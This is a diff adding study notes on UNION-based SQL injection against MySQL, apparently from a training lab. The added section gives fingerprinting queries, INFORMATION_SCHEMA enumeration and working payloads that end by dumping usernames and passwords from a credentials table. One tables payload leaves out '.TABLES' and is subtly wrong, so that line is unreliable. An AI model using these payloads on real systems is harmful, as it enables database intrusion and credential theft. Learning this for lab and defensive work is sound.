@@ -735,4 +735,92 @@ now we know that we can do other things like:
 
 ![](Images/Pasted%20image%2020240129124034.png)
 
+## Database Enumeration 
+
+### MySQL fingerprinting 
+
+before we enumerate the database we need to know what kind of DBMS we are using so that we know what kinds of queries we can run 
+
+some initial guesses we can do are: 
+- apache and nginx = linux = mysql 
+- IIS = mssql
+
+these queries can tell us that we are working with MySQL: 
+- `SELECT @@version` - when we have full query output - MySQL and MSSQL will return version, error on other
+- `SELECT POW(1,1)` - when we only have numeric output - MySQL returns 1, error on other
+- `SELECT SLEEP(5)` - blind or no output - delays page response for 5 seconds and returns 0, will not delay on other 
+
+### INFORMATION_SCHEMA database 
+
+to pull info from the databases we need some info: 
+- list of dbs 
+- list of tables in each db
+- list of columns in each table 
+
+the INFORMATION_SCHEMA database has metadata about the db and tables   
+this is a special db that we can't call its tables directly with a `SELECT` statement  
+
+to reference a table in another DB we can use `.`: 
+
+`SELECT * FROM my_database.users;`
+
+### SCHEMATA 
+
+the table `SCHEMATA` in the `INFORMATION_SCHEMA` database has info about all databases on the server   
+used to obtain db names so we can query them 
+
+the `SCHEMA_NAME` column contains all the db names currently present 
+
+`SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
+
+note that the first 3 results from this query will show the default MySQL databases present on any server   
+sometimes there is a fourth 'sys' db as well 
+
+so now we can try payloads like: 
+
+`cn' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- `
+
+![](Images/Pasted%20image%2020240129160558.png)
+
+apart from the default databases we can see "dev" and "ilfreight"
+
+now we can try to find out which database the web app is using to retrieve the ports data from   
+we can get the current database with `SELECT database()`: 
+
+`cn' UNION SELECT 1,database(),2,3-- `
+
+![](Images/Pasted%20image%2020240129160810.png)
+
+### TABLES 
+
+before we dump data from the dev database we need a list of tables to query  
+to find all the tables within a database we can use the `TABLES` table in the `INFORMATION_SCHEMA` database
+
+`TABLES` contains info about all tables throughout the database   
+we are interested in the `TABLE_SCHEMA` column for each database the table belongs to and `TABLE_NAME` for all table names
+
+`cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA WHERE table_schema='dev'-- `
+
+![](Images/Pasted%20image%2020240129161417.png)
+
+with the specified `table_schema='dev'` we can return only tables that exist in the dev database 
+
+### COLUMNS
+
+now we can start dumping data for the found tables  
+the `COLUMNS` table in the `INFORMATION_SCHEMA` database contains info about all columns present in all the databases 
+
+the columns we are interested in are `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` 
+
+`cn' UNION SELECT 1,COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- `
+
+![](Images/Pasted%20image%2020240129162551.png)
+
+### Data
+
+now we have all the info we need to dump data from the credentials table in the dev database: 
+
+`cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- `
+
+![](Images/Pasted%20image%2020240129162728.png)
 
